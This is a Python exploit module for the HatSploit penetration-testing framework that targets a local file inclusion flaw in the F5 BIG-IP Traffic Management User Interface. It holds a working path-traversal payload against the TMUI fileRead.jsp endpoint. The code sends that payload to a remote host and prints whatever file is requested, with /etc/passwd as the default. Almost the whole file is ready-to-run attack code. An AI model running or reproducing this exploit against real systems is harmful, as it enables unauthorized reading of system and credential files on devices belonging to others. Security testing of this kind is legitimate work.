#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.module import HatSploitModule

from utils.tcp_tools import tcp_tools
from utils.web_tools import web_tools

class HatSploitModule(HatSploitModule):
    tcp_tools = tcp_tools()
    web_tools = web_tools()

    details = {
        'Name': "F5 Big-IP TMUI Local File Inclusion",
        'Module': "exploit/multi/f5_big_ip_tmui/local_file_inclusion",
        'Authors': [
            'enty8080'
        ],
        'Description': "Local File Inclusion in F5 BIG-IP Traffic Management User Interface (TMUI).",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Risk': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 443,
            'Required': True
        },
        'RFILE': {
            'Description': "Remote file to read.",
            'Value': "/etc/passwd",
            'Required': True
        }
    }

    def generate_payload(self, remote_file):
        self.badges.output_process("Generating payload...")

        payload = f"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName={remote_file}"
        return payload

    def send_payload(self, target_url, payload):
        self.badges.output_process("Sending payload...")
        response = self.web_tools.http_request("GET", target_url, payload)

        if response.status_code != 200:
            self.badges.output_error("Failed to send payload!")
            return None

        return response

    def run(self):
        remote_host, remote_port, remote_file = self.parser.parse_options(self.options)

        target = self.web_tools.format_host_and_port(remote_host, remote_port)
        self.badges.output_process("Exploiting " + target + "...")

        target_url = self.web_tools.craft_url(remote_host, remote_port)
        if not self.web_tools.check_url_access(target_url):
            self.badges.output_error("Exploit failed!")
            return

        payload = self.generate_payload(remote_file)
        response = self.send_payload(target_url, payload)

        if not response:
            self.badges.output_error("Exploit failed!")
            return

        self.badges.output_process("Attempting to read file...")
        remote_file_output = response.json()["output"].strip()

        if remote_file_output:
            self.badges.output_empty(remote_file_output)
        else:
            self.badges.output_warning("File is empty.")
